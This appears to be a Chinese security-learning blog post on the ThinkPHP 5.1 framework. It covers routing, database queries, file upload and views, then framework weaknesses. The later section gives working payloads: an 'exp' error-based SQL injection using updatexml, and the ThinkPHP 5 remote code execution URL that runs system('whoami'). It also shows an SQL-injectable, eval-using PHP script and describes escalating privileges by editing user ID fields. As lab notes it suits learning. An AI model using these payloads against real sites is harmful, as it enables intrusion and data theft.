---
title: PHP应用&TP框架&路由访问&内置过滤绕过&核心漏洞
published: 2025-10-16
description: TP框架开发过程可能因写法导致的路由访问、数据库操作、文件上传、还有框架漏洞问题。
tags: [PHP,安全开发]
category: 网络安全
draft: false
---

# PHP应用&TP框架&路由访问&对象操作&内置过滤绕过&核心漏洞

## TP框架—开发—配置架构&路由&MVC模型

参考：https://www.thinkphp.cn/doc

### 配置架构—导入使用

去thinkphp官网可以看到，目前最新的版本是更新到了thinkphp8.0，但是本次演示案例用到的都是thinkphp5.1版本。

在phpstudy中把路径指定到tp5框架中的public，之后即可正常访问到页面。

在public路径下可以看到一个index.php文件，其中又定义了一个应用目录application，在官网手册中也可以看到index.php是入口文件。具体版本入口文件需要参考上方文档处。

也可以找到application—>index—>controller下的index.php，尝试修改其中的代码，看看回显出来的页面是否也会改变。此处我没有进行修改，所以就是显示默认的界面。

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-01.png" style="zoom:80%;" />

### 路由访问—URL访问

通过tp5文档中，可以看到模块指的就是application下的index目录，控制器指的是index目录下的index.php，操作指index.php中的function index()。

因此也就可以用ip/index.php/index/index来访问。

```http
url:自己的ip/index.php(在index文件下的)/index（目录）/index（文件）/index（函数）
```

#### 非官方写法访问方式

当使用非官方的写法访问时，可以看到只能用?x=1来访问，而当使用/x/1时访问报错。

我这里就不用框架的代码展示了，只展示关键部分的代码：

```php
<?php
    namespace app\index\controller;
    use think\Request;
class Index
{
    public function test(){
        $x = $_GET['x'];
        return $x;
    }
}

?>
```

此时进行访问：

```http
url:ip/index.php/index/index/test?x=1(此处的1只是举例)
```

是可以看到获取到的1出现在页面上，如果换成下方这个，是会返回未定义数组索引：x的一个报错界面。

```http
url:ip/index.php/index/index/test?x/1
```

#### 官方写法访问方式

注意：如果你继承了系统的控制器基类`think\Controller`的话，系统已经自动完成了请求对象的构造方法注入了，你可以直接使用`$this->request`属性调用当前的请求对象。

```php
<?php
    namespace app\index\controller;

    use think\Request;
    use think\Controller;
class Index extend Controller
{
    public function test(){
        // request其实就是把get和post封装在了里面
        // 如果想单独使用get和post的话可以直接去官方文档中的输入变量进行查看。
        return $this->request->param('name');
    }
}

?>
```

此时以下地址的访问都是可以看到界面的返回内容。

```http
url:ip/index.php/index/index/test?name=随意填写
url:ip/index.php/index/index/test?name/随意填写
```

#### MVC模型

对应model（模板）view（视图）controller（控制器）

其中核心代码文件在controller中。

### 数据库操作—应用对象

配置部分我就跳过了，因为这个很简单，路径是在application下的database.php中，按照自己创建的数据库进行相应的设置即可。

后面数据库的一些操作，可以自行查找sql语句，这个一般都是现用现查。

查询举例：

```php
<?php
namespace app\Test\controller;
use think\Db;
use think\Controller;
 
class Test extends Controller
{
	
/* 	public function index(){
		
		echo "123";
	} */
	public function testsql()
    {
		$data = Db::table('user')->where('id',1)->find();
		print_r($data);
    }
}
?>
```

效果如图：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-02.png" style="zoom:80%;" />

#### 非官方写法

在ThinkPHP—>application下新建一个test文件夹，并在这个文件夹下创建controller文件夹，其中包含Test.php。

以之前的news.php为例：

```php
<?php
include 'config.php';
//读取news.html中的内容
$template=file_get_contents('news.html');
 
$id=$_GET['id'] ?? '1';
$sql="select * from news where id=$id";
echo $sql;
$data=mysqli_query($con,$sql);
while($row=mysqli_fetch_row($data)){
    $page_title=$row[1];
    $heading=$row[2];
    $subheading=$row[3];
    $content=$row[4];
    $item=$row[5];
}
 
$template=str_replace('{page_title}',$page_title,$template);
$template=str_replace('{heading}',$heading,$template);
$template=str_replace('{subheading}',$subheading,$template);
$template=str_replace('{content}',$content,$template);
$template=str_replace('{$item}',$item,$template);
 
eval('?>'.$template);
//eval函数会将传递给它的字符串作为PHP代码执行，即将?>连接到$template的开头，再执行该字符串
?>
```

当在url中执行?id=1 and 1=1时，可以看到这个值会被接收：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-03.png" style="zoom:80%;" />

现在用tp再进行同样的操作，发现tp中是被过滤掉的。

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-04.png" style="zoom:80%;" />

以下是对两个测试的总结：

1. tp中是被过滤掉的（使用tp框架操作数据库，默认是受到框架内置过滤保护），即拼接的语句无效。
2. 原生态的数据库操作如果没有过滤就会受到SQL注入攻击。

### 文件上传操作—应用对象

首先是在public文件夹中创建一个upload.html

```html
<form action="/index.php/test/test/upload" enctype="multipart/form-data" method="post">
    <input type="file" name="image" /> <br>
    <input type="submit" value="上传" />
</form>
```

之后还是在test中添加upload方法

根据代码中上传文件的位置，在application中创建一个uploads文件夹。

由于phpstudy中的根目录就是public文件夹，因此可以直接用ip/upload.php来访问。

```php
	public function upload(){
		 // 获取表单上传文件 例如上传了001.jpg
        $file = request()->file('image');//获取表单上传文件
        // 移动到框架应用根目录/uploads/ 目录下
        $info = $file->validate(['size'=>1567800,'ext'=>'jpg,png,gif'])->move( '../uploads');
        if($info){
            // 成功上传后 获取上传信息
            // 输出 jpg
            echo $info->getExtension();
            // 输出 20160820/42a79759f284b767dfcb2a0197904287.jpg
            echo $info->getSaveName();
            // 输出 42a79759f284b767dfcb2a0197904287.jpg
            echo $info->getFilename();
        }else{
            // 上传失败获取错误信息
            echo $file->getError();
        }

  }
```

上传成功后如图所示，因为这个是带校验的，所以当上传其他后缀文件时，就会提示非法后缀文件，只有代码中指定的三个格式的图片进行上传才会成功（创建的空图片即使后缀是以上格式，但也会上传失败，提示非法图片文件）。

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-05.png" style="zoom:80%;" />

### 前端页面渲染—MVC模型

在ThinkPHP—>application—>index下创建view文件夹，再在view下创建index文件夹，在其创建test.html。

当index.php中为return $this->fetch('');时，默认渲染index.html，所以这里需要指定test。访问后页面如下：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-06.png" style="zoom:80%;" />

## TP框架—安全—不安全写法&版本过滤绕过

### 内置代码写法

#### 例子：不合规的代码写法—TP5—代码分析

详细见：https://blog.csdn.net/m0_74930529/article/details/143527573

### 框架版本安全

#### 例子 1：写法内置安全绕过—TP5—SQL注入

**报错型SQL注入**

参考文章：https://www.cnblogs.com/Yhck/p/15808056.html

当用户输入的数据以`exp`开头时，会直接拼接到SQL语句中，未经过滤，`insert()`和`update()`方法会调用存在问题的`parseData`函数。

url拼接：

```http
?username[0]=exp&username[1]=updatexml(1,concat('~',user(),'~'),1)   会回显用户&主机名
?username[0]=exp&username[1]=updatexml(1,concat('~',database(),'~'),1)   会回显数据库名
```

| 片段                         | 含义                                                         |
| ---------------------------- | ------------------------------------------------------------ |
| **updatexml(1, …, 1)**       | MySQL 的内置函数，本来用来修改 XML 文档；**只要第二个参数不是合法 XPath，就会报错并把参数内容回显给客户端** → 典型的“报错注入”手法。 |
| **concat('~', user(), '~')** | 把当前数据库用户名拼成一串，例如 `~root@localhost~`。        |
| 整个函数                     | 因为 XPath 非法，MySQL 会抛错并回显 `~root@localhost~`，攻击者就能在报错页面里直接看到用户名，完成一次“带外数据提取”。 |

#### 例子 2：内置版本安全漏洞—TP5—代码执行

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-07.png" style="zoom:80%;" />

在ip后面输入`/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`，可以得到：

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-08.png" style="zoom:80%;" />

## 逻辑越权（类似于linux中的用户等级）

如下图，假设管理员的uid=1，普通会员的uid=100。当使用select * from users where username=‘admin’来取出uid结果时，如果uid=1，则展示管理员页面。

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-09.png" style="zoom:80%;" />

而在逻辑越权时，经常需要修改用户id编号，这个id编号也就类似于uid。当把uid=100修改成了uid=1，也就使普通用户变成了管理员，即实现了权限地跨越。

当使用discuz注册一个用户时，可以看到有adminid和groupid，系统就是以这两个来区分管理员和普通用户。当修改adminid=1、groupid=1后，就可以实现逻辑越权，从普通用户变成管理员。

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/27-10.png" style="zoom:80%;" />